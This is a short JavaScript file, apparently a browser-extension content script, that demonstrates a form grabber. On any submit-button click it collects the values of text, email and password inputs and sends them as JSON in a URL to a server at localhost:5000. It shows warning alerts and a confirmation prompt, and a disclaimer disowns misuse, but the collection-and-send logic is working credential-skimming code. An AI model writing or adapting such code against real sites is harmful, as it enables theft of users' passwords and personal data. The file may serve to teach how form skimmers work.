/**
 * DISCLAIMER
 * USE THIS CODE WITH CAUTION, UNDER YOUR OWN RISK. THE AUTHOR OF THIS PROJECT WILL NOT BE RESPONSIBLE FOR ANY MISUSE.
 * FOR MORE INFORMATION, PLEASE READ README.MD.
 */

// Define the server URL
const serverURL = "http://localhost:5000/";

// Select all input elements
const inputElements = document.querySelectorAll("input");

// Function to collect form data
function collectFormData() {
  alert(
    "WARNING: All data entered into any form will be collected and sent to a local server: " +
      serverURL
  );

  const accepts = confirm("Are you sure that you want to proceed?");

  if (accepts) {
    const formData = [];

    for (const input of inputElements) {
      if (
        input.type === "text" ||
        input.type === "email" ||
        input.type === "password"
      ) {
        alert("Collecting data from input...");
        const name = input.name;
        const value = input.value;
        const inputInfo = { name, value };
        formData.push(inputInfo);
      }
    }

    return formData;
  } else {
    alert(
      "Please, if you didn't install this extension, remove it inmediatically. you are under risk."
    );
    throw new Error("Cancelled by the user");
  }
}

// Function to send data to the server
function sendData(data) {
  alert("Sending data to the server");
  const dataString = JSON.stringify(data);
  const fullURL = serverURL + dataString;

  open(fullURL);
}

// Add event listeners to buttons
const submitButtons = document.querySelectorAll("button, input[type='submit']");
for (const button of submitButtons) {
  button.addEventListener("click", () => {
    const formData = collectFormData();
    sendData(formData);
  });
}
